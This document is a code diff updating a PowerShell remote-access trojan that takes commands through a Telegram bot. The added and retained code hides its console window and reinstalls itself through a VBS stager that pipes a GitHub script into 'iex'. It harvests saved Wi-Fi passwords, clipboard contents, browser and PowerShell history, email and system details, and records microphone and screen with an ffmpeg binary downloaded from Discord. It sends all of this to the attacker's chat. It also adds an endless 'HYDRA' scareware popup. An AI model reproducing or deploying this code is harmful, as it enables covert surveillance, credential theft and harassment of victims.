@@ -14,15 +14,8 @@ SEE README FOR MORE INFO
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
-# HIDE THE WINDOW - Change to 1 to hide the console window
-$HideWindow = 1
-
-If ($HideWindow -gt 0){
-$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
-add-type -name win -member $Import -namespace native;
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
-}
-
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
+$version = "1.7.0" # Current Version
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
@@ -30,9 +23,42 @@ $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
 
+# Hide the console window
+If ($HideWindow -gt 0){
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+}
+
+# Check version and update
+$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+$versionCheck = irm -Uri "https://pastebin.com/raw/53qHJkJC"
+$VBpath = "C:\Windows\Tasks\service.vbs"
+if (Test-Path $newScriptPath){
+Write-Output "Persistance Installed - Checking Version.."
+    if (!($version -match $versionCheck)){
+        Write-Output "Newer version available! Downloading and Restarting"
+        Remove-Persistance
+        Add-Persistance
+        $tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+"@
+        $tobat | Out-File -FilePath $VBpath -Force
+        sleep 1
+        & $VBpath
+        exit
+    }
+}
+
+# remove restart stager (if present)
+if(Test-Path "C:\Windows\Tasks\service.vbs"){
+    rm -path "C:\Windows\Tasks\service.vbs" -Force
+}
+
 # Startup Delay
 Sleep 5
-if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
 
 # Get Chat ID from the bot
 while($chatID.length -eq 0){
@@ -71,8 +97,6 @@ Exfiltrate   : Sends files (see 'Extra-Info' for more)
 Save-Passwords : Gather all passwords from computer
 Upload      : Uploads a specific file (use -path)
 System-Info   : Send System info as text file
-Software-Info   : Send Software info as text file
-History-Info   : Send History info as text file
 Enumerate-LAN   : Info for other devices on the LAN
 Add-Persistance   : Add Telegram C2 to Startup
 Remove-Persistance   : Remove Startup Persistance
@@ -80,6 +104,8 @@ Is-Admin   : Checks if session has admin Privileges
 Attempt-Elevate  : Send user a prompt to gain Admin
 Message   : Send a custom message to the user
 Take-Picture  : Send a Webcann picture.
+Nearby-Wifi  : Show nearby wifi networks       
+Send-Hydra  : Never ending popups (use killswitch)   
 Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
 **ADMIN ONLY FUNCTIONS**
 Disable-AV   : Attempt to exclude C:/ from Defender
@@ -153,6 +179,57 @@ if (Test-Path -Path $path){
 }else{Write-Host "File Not Found: $path"}
 }
 
+Function Nearby-Wifi {
+$showNetworks = explorer.exe ms-availablenetworks:
+sleep 5
+$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
+$Wifi = ($NearbyWifi|Out-String)
+$contents = "$wifi"
+Post-Message | Out-Null
+}
+
+Function Send-Hydra {
+$tobat = @'
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+Add-Type -AssemblyName System.Windows.Forms
+    function Create-Form {
+        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
+        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
+        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
+        $form.Controls.AddRange(@($Text, $Close));return $form
+    }
+    while ($true) {
+        $form = Create-Form
+        $form.StartPosition = 'Manual'
+        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
+        $result = $form.ShowDialog()
+        $messages=ReceiveMSG
+        if ($messages.message.text -contains "kill") {
+            $contents = "$comp $env:COMPUTERNAME $closed Hydra Stopped!"
+            Post-Message
+            break
+        }
+        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
+            $form2 = Create-Form
+            $form2.StartPosition = 'Manual'
+            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
+            $form2.Show()
+        }
+        $random = (Get-Random -Minimum 0 -Maximum 2)
+        Sleep $random
+    }
+'@
+$pth = "C:\Windows\Tasks\service.ps1"
+$tobat | Out-File -FilePath $pth -Force
+& $pth
+Sleep 7
+rm -Path $pth
+$contents = "$comp $env:COMPUTERNAME $waiting Sent Hydra to User.."
+Post-Message
+}
+
 Function SpeechToText {
 $contents = "$tick $env:COMPUTERNAME $tick Transcription Started.. (Stop with Killswitch)"
 Post-Message
@@ -178,19 +255,18 @@ while ($true) {
 
 Function Record-Audio{
 param ([int[]]$t)
-$contents = "$env:COMPUTERNAME $tick Recording Started for $t seconds.."
-Post-Message | Out-Null
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
+$contents = "$comp $env:COMPUTERNAME $comp Downloading ffmpeg.exe to client.."
+Post-Message | Out-Null
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
-sleep 1
-
+$contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
+Post-Message | Out-Null
 Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
 function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
 $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
-
 $filePath = "$env:Temp\AudioClip.mp3"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $filePath
@@ -201,17 +277,18 @@ rm -Path $filePath -Force
 
 Function Record-Screen{
 param ([int[]]$t)
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
-If (!(Test-Path $Path)){  
+If (!(Test-Path $Path)){
+$contents = "$comp $env:COMPUTERNAME $comp Downloading ffmpeg.exe to client.."
+Post-Message | Out-Null
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
-sleep 1
+$contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
+Post-Message | Out-Null
 $filePath = "$env:Temp\ScreenClip.mkv"
 if ($t.Length -eq 0){$t = 10}
-.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $filePath
+.$env:Temp\ffmpeg.exe -f gdigrab -t $t -framerate 25 -i desktop $filePath
 Post-File
 sleep 1
 rm -Path $filePath -Force
@@ -253,7 +330,7 @@ foreach ($folder in $foldersToSearch) {
                     }
                 }
                 $entryName = $file.FullName.Substring($folder.Length + 1)
-                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
+                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName) | Out-Null
                 $currentZipSize += $fileSize
             }
         }
@@ -386,78 +463,32 @@ Start-Sleep -Milliseconds 10
 }
 
 Function System-Info{
-$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
-$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
-$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.DefaultIPGateway.length -gt 1}
-$NearbyWifi = explorer.exe ms-availablenetworks: ; sleep 4; (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim()
-$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
-$computerSystem = Get-CimInstance CIM_ComputerSystem
-$computerBIOS = Get-CimInstance CIM_BIOSElement
-$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
-$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
-$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
-$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
-$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
-$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
-$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
+$contents = "$comp Gathering System Information for $env:COMPUTERNAME $comp"
+Post-Message
+$userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
+$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
 $systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
 $userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
-$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
-if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
-$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
-$FilePath = "$env:temp\SystemInfo.txt"
-"USER INFO `n =========================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII
-"$fullName" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Email Address      : $email" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Language           : $systemLanguage" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Keyboard Layout    : $keyboardLayoutID`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($computerOs| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"NETWORK INFO `n ======================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Public IP          : $computerPubIP`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"vvv  Saved Networks  vvv `n$outssid" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($computerIP| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($network| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Nearby-WiFi        `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($NearbyWifi| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"HARDWARE INFO `n ======================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"BIOS Info          : $computerBIOS`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"vvv  RAM Info  vvv `nTotal RAM : $computerRamCapacity" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($computerRam| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($computerCpu| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($videocard| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($Hdds| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($COMDevices| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
-}
-
-Function Software-Info{
+$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
+$processorInfo = Get-WmiObject -Class Win32_Processor
+$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
+$userInfo = Get-WmiObject -Class Win32_UserAccount
+$videocardinfo = Get-WmiObject Win32_VideoController
+$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
+$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+$users = "$($userInfo.Name)"
+$userString = "`nFull Name : $($userInfo.FullName)"
+$OSString = "$($systemInfo.Caption) $($systemInfo.OSArchitecture)"
+$systemString = "Processor : $($processorInfo.Name)"
+$systemString += "`nMemory : $RamInfo"
+$systemString += "`nGpu : $($videocardinfo.Name)"
+$systemString += "`nStorage : $Hddinfo"
+$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
 $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
 $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
-$FilePath = "$env:temp\SoftwareInfo.txt"
-"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($software| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
-($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
-}
-
-Function History-Info{
-$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
 $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
 $Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
@@ -465,7 +496,37 @@ $Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:U
 $Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
 $Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
-$FilePath = "$env:temp\History.txt"
+$FilePath = "$env:temp\systeminfo.txt"
+$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
+if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
+$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime
+$contents = "========================================================
+Current User    : $env:USERNAME
+Email Address   : $email
+Language        : $systemLanguage
+Keyboard Layout : $keyboardLayoutID
+Other Accounts  : $users
+Public IP       : $computerPubIP
+Current OS      : $OSString
+Hardware Info
+--------------------------------------------------------
+$systemString"
+"--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $FilePath -Encoding ASCII
+"General Info `n $contents" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Network Info `n -----------------------------------------------------------------------`n$outssid" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"USB Info  `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($COMDevices| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($software| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Processes  `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Services `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Drivers `n -----------------------------------------------------------------------`n$drivers" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 (Get-Clipboard | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
@@ -474,9 +535,10 @@ $FilePath = "$env:temp\History.txt"
 ($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
+($RecentFiles | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
+Post-Message
 Post-File ;rm -Path $FilePath -Force
-"Recent Files `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($RecentFiles | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 }
 
 Function Enumerate-LAN{
@@ -776,3 +838,4 @@ $messages=ReceiveMSG
         }
     }
 }
+
